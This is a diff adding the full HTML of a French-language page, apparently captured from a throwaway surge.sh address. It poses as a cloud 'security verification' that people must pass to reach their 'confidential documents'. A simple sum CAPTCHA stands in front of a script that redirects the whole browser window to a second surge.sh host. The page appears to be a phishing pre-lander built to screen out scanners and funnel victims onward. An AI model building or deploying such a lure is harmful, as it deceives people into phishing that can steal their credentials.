@@ -1,0 +1,218 @@
+<!-- url: https://placin-aryd.surge.sh/secr
+status: 200 -->
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Documents - Cloud</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: "Segoe UI", Roboto, sans-serif;
+        background-color: #f2f2f2;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+      }
+
+      .container {
+        background: white;
+        border: 1px solid #ddd;
+        border-radius: 10px;
+        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+        padding: 40px 30px;
+        width: 100%;
+        max-width: 400px;
+        box-sizing: border-box;
+        text-align: center;
+        opacity: 0;
+        transform: translateY(30px);
+        transition:
+          opacity 0.6s ease,
+          transform 0.6s ease;
+      }
+
+      .mocopoer {
+        width: 60px;
+        height: auto;
+        margin-bottom: 20px;
+      }
+
+      h2 {
+        color: #333;
+        font-size: 1.3rem;
+        margin-bottom: 10px;
+      }
+
+      p.subtext {
+        color: #777;
+        font-size: 0.95rem;
+        margin-bottom: 20px;
+      }
+
+      .form-group {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        margin-bottom: 20px;
+      }
+
+      input[type="number"] {
+        width: 100%;
+        padding: 12px 15px;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+        font-size: 1rem;
+        box-sizing: border-box;
+      }
+
+      button {
+        background-color: #1c90bc;
+        color: white;
+        border: none;
+        padding: 12px;
+        font-size: 1rem;
+        font-weight: bold;
+        border-radius: 6px;
+        cursor: pointer;
+        width: 100%;
+        transition:
+          opacity 0.3s ease,
+          background-color 0.3s ease;
+      }
+
+      button:hover {
+        background-color: #e66e00;
+      }
+
+      button:disabled {
+        cursor: not-allowed;
+        background-color: #d37200;
+      }
+
+      .error {
+        margin-top: 10px;
+        color: red;
+        font-size: 0.9rem;
+      }
+
+      .question {
+        margin-bottom: 15px;
+        font-weight: bold;
+        color: #444;
+      }
+
+      .spinner {
+        display: inline-block;
+        width: 20px;
+        height: 20px;
+        border: 3px solid #fff;
+        border-radius: 50%;
+        border-top-color: #ff7900;
+        animation: spin 0.8s linear infinite;
+        vertical-align: middle;
+        margin-left: 10px;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <img
+        src="https://i.ibb.co/dsfwkgQj/mocopoer.png"
+        alt="cglm"
+        class="mocopoer"
+      />
+      <h2>Vérification de sécurité</h2>
+      <p class="subtext">
+        Pour accéder à vos documents confidentiels, confirmez que vous êtes
+        humain :
+      </p>
+
+      <form id="captchaForm">
+        <div class="question" id="question"></div>
+        <div class="form-group">
+          <input
+            type="number"
+            id="answer"
+            placeholder="Entrez la réponse"
+            required
+          />
+          <button type="submit" id="submitBtn">Vérifier</button>
+        </div>
+        <div class="error" id="errorMsg"></div>
+      </form>
+    </div>
+
+    <audio id="success-sound" src="success.mp3" preload="auto"></audio>
+
+    <script>
+      let a, b, correct;
+
+      function generateCaptcha() {
+        a = Math.floor(Math.random() * 10);
+        b = Math.floor(Math.random() * 10);
+        correct = a + b;
+        document.getElementById("question").textContent =
+          `Combien font ${a} + ${b} ?`;
+      }
+
+      generateCaptcha();
+
+      document
+        .getElementById("captchaForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const answerInput = document.getElementById("answer");
+          const answer = parseInt(answerInput.value.trim());
+          const errorMsg = document.getElementById("errorMsg");
+          const button = document.getElementById("submitBtn");
+
+          errorMsg.textContent = "";
+
+          if (isNaN(answer)) {
+            errorMsg.textContent = "❌ Veuillez entrer un nombre.";
+            return;
+          }
+
+          if (answer === correct) {
+            if (navigator.vibrate) navigator.vibrate(100);
+            const audio = document.getElementById("success-sound");
+            audio.play().catch(() => {});
+
+            button.disabled = true;
+            button.style.opacity = "0.6";
+            button.textContent = "Chargement...";
+
+            setTimeout(() => {
+              localStorage.setItem("captchaValide", "true");
+              window.top.location.href = "https://repefera-etu.surge.sh/gramot";
+            }, 1500);
+          } else {
+            errorMsg.textContent = "❌ Mauvaise réponse. Réessayez.";
+            generateCaptcha();
+            answerInput.value = "";
+            button.disabled = false;
+            button.style.opacity = "1";
+            button.textContent = "Vérifier";
+          }
+        });
+
+      window.addEventListener("DOMContentLoaded", () => {
+        const box = document.querySelector(".container");
+        box.style.opacity = "1";
+        box.style.transform = "translateY(0)";
+      });
+    </script>
+  </body>
+</html>
